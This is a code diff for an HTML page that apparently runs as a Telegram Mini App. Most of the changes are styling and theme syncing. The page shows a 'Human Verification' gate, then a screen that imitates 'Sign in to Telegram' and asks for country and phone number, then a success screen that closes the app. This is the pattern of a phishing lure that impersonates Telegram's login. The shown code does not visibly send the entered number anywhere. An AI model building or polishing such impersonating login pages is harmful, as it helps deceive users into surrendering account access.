@@ -9,15 +9,24 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
+    html, body { min-height: 100vh; font-family: 'DM Sans', sans-serif; }
+
     body {
-      font-family: 'DM Sans', sans-serif;
-      min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: radial-gradient(ellipse at 50% 0%, #1a3a2a 0%, #0d1f16 40%, #080f0c 100%);
       padding: 24px;
-      transition: background 0.2s, color 0.2s;
+    }
+
+    /* Page 1 & 3 use dark green background */
+    body.dark {
+      background: radial-gradient(ellipse at 50% 0%, #1a3a2a 0%, #0d1f16 40%, #080f0c 100%);
+    }
+
+    /* Page 2 uses Telegram theme background */
+    body.tg-theme {
+      background-color: var(--tg-theme-bg-color, #ffffff);
+      color: var(--tg-theme-text-color, #000000);
     }
 
     .page { width: 100%; max-width: 360px; display: none; }
@@ -47,11 +56,10 @@
       margin: 0 auto 20px;
       box-shadow: 0 8px 24px rgba(62,207,110,0.35);
     }
-
     .icon-wrap svg { width: 32px; height: 32px; stroke: white; stroke-width: 2.5; fill: none; }
 
     .welcome { color: rgba(255,255,255,0.45); font-size: 14px; font-weight: 500; margin-bottom: 8px; }
-    h1 { color: #3ecf6e; font-size: 26px; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 10px; }
+    h1.green { color: #3ecf6e; font-size: 26px; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 10px; }
     .subtitle { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 32px; }
 
     .btn-green {
@@ -67,9 +75,10 @@
     .btn-green:active { transform: scale(0.98); }
     .btn-green:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
-    /* PAGE 2 - Telegram sign-in style */
+    /* PAGE 2 - Telegram sign-in */
     .signin-card {
-      width: 340px;
+      width: 100%;
+      max-width: 340px;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -78,15 +87,19 @@
     .logo {
       width: 100px; height: 100px;
       border-radius: 50%;
-      background: #2AABEE;
+      background-color: var(--tg-theme-button-color, #2AABEE);
       display: flex; align-items: center; justify-content: center;
       margin-bottom: 1.5rem;
     }
 
-    .signin-card h1 { font-size: 26px; font-weight: 700; color: var(--tg-text); margin-bottom: 0.6rem; text-align: center; }
+    .signin-card h1 {
+      font-size: 26px; font-weight: 700;
+      color: var(--tg-theme-text-color, #000000);
+      margin-bottom: 0.6rem; text-align: center;
+    }
 
     .sub {
-      font-size: 14px; color: var(--tg-hint);
+      font-size: 14px; color: var(--tg-theme-hint-color, #888888);
       text-align: center; line-height: 1.55; margin-bottom: 2rem;
     }
 
@@ -94,34 +107,35 @@
 
     .field label {
       position: absolute; top: -8px; left: 10px;
-      font-size: 12px; color: var(--tg-hint);
-      background: var(--tg-bg); padding: 0 4px;
-      line-height: 1; pointer-events: none; z-index: 1;
+      font-size: 12px; color: var(--tg-theme-hint-color, #888888);
+      background-color: var(--tg-theme-bg-color, #ffffff);
+      padding: 0 4px; line-height: 1; pointer-events: none; z-index: 1;
     }
 
     .field select, .field input {
       width: 100%;
-      border: 1px solid var(--tg-border);
+      border: 1px solid var(--tg-theme-hint-color, #cccccc);
       border-radius: 6px;
       padding: 13px 40px 13px 14px;
       font-size: 15px; font-family: 'DM Sans', sans-serif;
-      color: var(--tg-text); background: var(--tg-secondary-bg);
+      color: var(--tg-theme-text-color, #000000);
+      background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
       outline: none; appearance: none; -webkit-appearance: none;
       transition: border-color 0.15s;
     }
-
-    .field input::placeholder { color: var(--tg-hint); }
-    .field select:focus, .field input:focus { border-color: var(--tg-button); }
+    .field input::placeholder { color: var(--tg-theme-hint-color, #aaaaaa); }
+    .field select:focus, .field input:focus { border-color: var(--tg-theme-button-color, #2AABEE); }
 
     .chevron {
       position: absolute; right: 12px; top: 50%;
       transform: translateY(-50%);
-      pointer-events: none; color: var(--tg-hint); font-size: 18px;
+      pointer-events: none; color: var(--tg-theme-hint-color, #888888); font-size: 18px;
     }
 
     .btn-tg {
       width: 100%; padding: 15px; border-radius: 8px; border: none;
-      background: var(--tg-button); color: var(--tg-button-text);
+      background-color: var(--tg-theme-button-color, #2AABEE);
+      color: var(--tg-theme-button-text-color, #ffffff);
       font-size: 15px; font-weight: 700; font-family: 'DM Sans', sans-serif;
       letter-spacing: 0.06em; cursor: pointer; margin-top: 0.25rem;
       transition: opacity 0.15s, transform 0.1s;
@@ -132,8 +146,9 @@
 
     .qr {
       margin-top: 1.2rem; font-size: 13px; font-weight: 600;
-      color: var(--tg-link); cursor: pointer;
-      background: none; border: none; font-family: 'DM Sans', sans-serif;
+      color: var(--tg-theme-link-color, #2AABEE);
+      cursor: pointer; background: none; border: none;
+      font-family: 'DM Sans', sans-serif;
     }
     .qr:hover { text-decoration: underline; }
 
@@ -151,7 +166,7 @@
     .success-sub { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 28px; }
   </style>
 </head>
-<body>
+<body class="dark">
 
   <!-- Page 1: Welcome -->
   <div class="page active" id="page1">
@@ -160,7 +175,7 @@
         <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
       <p class="welcome">Welcome, <span id="username1">there</span></p>
-      <h1>Human Verification</h1>
+      <h1 class="green">Human Verification</h1>
       <p class="subtitle">Verify below to be granted entry</p>
       <button class="btn-green" onclick="goToSignIn()">Click here to verify</button>
     </div>
@@ -173,7 +188,7 @@
         <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
           <path d="M4.5 27.5L14.8 31.4L18.8 44.2C19.1 45.1 20.2 45.4 20.9 44.7L26.7 38.9C27.4 38.2 28.4 38.2 29.1 38.8L39.9 47.1C40.7 47.7 41.9 47.3 42.2 46.3L52.5 10.3C52.8 9.2 51.7 8.2 50.6 8.6L4.4 25.4C3.2 25.8 3.3 27.1 4.5 27.5Z" fill="white"/>
           <path d="M14.8 31.4L18.1 38.5C18.4 39.2 19.4 39.3 19.8 38.7L26.7 38.9" fill="white" opacity="0.6"/>
-          <path d="M14.8 31.4L38.2 16.8" stroke="#2AABEE" stroke-width="1.5" stroke-linecap="round"/>
+          <path d="M14.8 31.4L38.2 16.8" stroke-width="1.5" stroke-linecap="round" stroke="white" opacity="0.4"/>
         </svg>
       </div>
       <h1>Sign in to Telegram</h1>
@@ -181,7 +196,7 @@
 
       <div class="field">
         <label>Country</label>
-        <select id="countrySelect">
+        <select>
           <option>USA (+1)</option>
           <option>UK (+44)</option>
           <option>Germany (+49)</option>
@@ -196,7 +211,7 @@
 
       <div class="field">
         <label>Phone Number</label>
-        <input type="tel" id="phoneInput" placeholder="+1" />
+        <input type="tel" placeholder="+1" />
       </div>
 
       <button class="btn-tg" id="nextBtn" onclick="goToSuccess()">NEXT</button>
@@ -217,26 +232,20 @@
   </div>
 
   <script>
-    function applyTheme(params) {
-      const p = params || {};
-      const root = document.documentElement;
-      root.style.setProperty('--tg-bg',           p.bg_color           || '#ffffff');
-      root.style.setProperty('--tg-text',         p.text_color         || '#000000');
-      root.style.setProperty('--tg-hint',         p.hint_color         || '#888888');
-      root.style.setProperty('--tg-link',         p.link_color         || '#2AABEE');
-      root.style.setProperty('--tg-button',       p.button_color       || '#2AABEE');
-      root.style.setProperty('--tg-button-text',  p.button_text_color  || '#ffffff');
-      root.style.setProperty('--tg-secondary-bg', p.secondary_bg_color || '#f5f5f5');
-      root.style.setProperty('--tg-border',       p.hint_color         || '#cccccc');
-    }
-
     const tg = window.Telegram?.WebApp;
+
     if (tg) {
-      tg.ready(); tg.expand();
-      applyTheme(tg.themeParams);
-      tg.onEvent('themeChanged', () => applyTheme(tg.themeParams));
-    } else {
-      applyTheme({});
+      tg.ready();
+      tg.expand();
+
+      function syncTheme() {
+        const bg = tg.themeParams.bg_color || '#ffffff';
+        tg.setBackgroundColor(bg);
+        tg.setHeaderColor(bg);
+      }
+
+      syncTheme();
+      tg.onEvent('themeChanged', syncTheme);
     }
 
     const user = tg?.initDataUnsafe?.user;
@@ -246,6 +255,7 @@
     function goToSignIn() {
       document.getElementById("page1").classList.remove("active");
       document.getElementById("page2").classList.add("active");
+      document.body.className = "tg-theme";
     }
 
     function goToSuccess() {
@@ -255,6 +265,7 @@
       setTimeout(() => {
         document.getElementById("page2").classList.remove("active");
         document.getElementById("page3").classList.add("active");
+        document.body.className = "dark";
         if (tg) setTimeout(() => tg.close(), 2000);
       }, 1200);
     }
